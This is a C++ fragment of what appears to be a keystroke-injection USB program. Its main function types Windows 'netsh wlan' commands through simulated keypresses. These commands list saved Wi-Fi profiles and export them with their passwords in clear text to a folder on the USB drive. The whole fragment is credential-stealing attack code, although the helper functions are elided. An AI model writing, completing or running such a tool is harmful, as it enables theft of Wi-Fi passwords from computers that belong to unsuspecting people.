...
int main() {
    ...
    std::wstring wifiPath = drivePath + L"wifi.txt";    //Text file's path

    //Command to execute
    std::wstring command = L"netsh wlan show profile"; //getting profile path

    //Execute the command
    typeKeys(command);                              //Write command 
    keyPress(VK_RETURN);                                //Press ENTER

    //Export passwords to text file in USB drive
    typeKeys(L"netsh wlan export profile key=clear folder=\"" + drivePath + L"\"");
    keyPress(VK_RETURN);
